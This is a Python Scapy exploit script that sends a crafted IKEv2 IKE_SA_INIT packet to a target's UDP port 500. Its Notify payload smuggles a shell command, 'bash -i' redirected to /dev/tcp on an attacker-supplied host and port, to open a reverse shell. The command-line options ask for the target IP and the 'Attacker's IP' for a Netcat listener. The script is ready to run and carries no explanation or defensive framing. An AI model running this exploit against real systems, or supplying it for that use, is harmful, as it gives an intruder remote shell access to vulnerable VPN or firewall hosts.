#!/usr/bin/python3
import sys
import argparse
import os
from scapy.all import *

# Redirect stderr to /dev/null to discard warnings
sys.stderr = open(os.devnull, 'w')

load_contrib('ikev2')

def send_ikev2_packet(destination, host, port):
    cmd = "\";bash -c \"exec bash -i &>/dev/tcp/" + host + "/" + port + " <&1;\";echo -n \""

    packet = IP(dst=destination) / UDP(dport=500) / IKEv2(init_SPI=RandString(8), next_payload='Notify', exch_type='IKE_SA_INIT', flags='Initiator') / IKEv2_payload_Notify(next_payload='Nonce', type=14, load="HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB" + cmd) / IKEv2_payload_Nonce(next_payload='None', load=RandString(68))

    send(packet)

def main():
    parser = argparse.ArgumentParser(description='Send a custom IKEv2 packet')

    # Define command-line arguments with flags and help messages
    parser.add_argument('-t', '--target', required=True, help='Target system IP address')
    parser.add_argument('-l', '--lhost', required=True, help='Attacker\'s IP address (run Netcat on this host)')
    parser.add_argument('-lp', '--lport', required=True, help='Attacker\'s port number (run Netcat on this port)')

    args = parser.parse_args()

    send_ikev2_packet(args.target, args.lhost, args.lport)

if __name__ == '__main__':
    try:
        main()
    except:
        # Display the help message if there is an exception
        parser.print_help()
        sys.exit(1)
